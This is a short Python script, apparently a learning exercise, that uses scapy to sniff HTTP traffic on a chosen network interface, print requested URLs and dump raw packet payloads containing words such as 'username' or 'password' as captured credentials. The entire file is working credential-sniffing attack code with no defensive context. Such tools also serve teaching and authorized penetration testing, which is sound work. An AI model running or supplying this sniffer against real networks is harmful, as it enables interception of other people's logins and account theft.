#!usr/bin/env python
#chichuke

import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="interface to sniff the packet")
    arguments = parser.parse_args()
    if not arguments.interface:
        parser.error("[-] Please specify interface using -i or --interface option")
    return arguments

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username","user","uname","login","password","pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible username/passwords >> " + str(login_info))


options = get_arguments()
sniff(options.interface)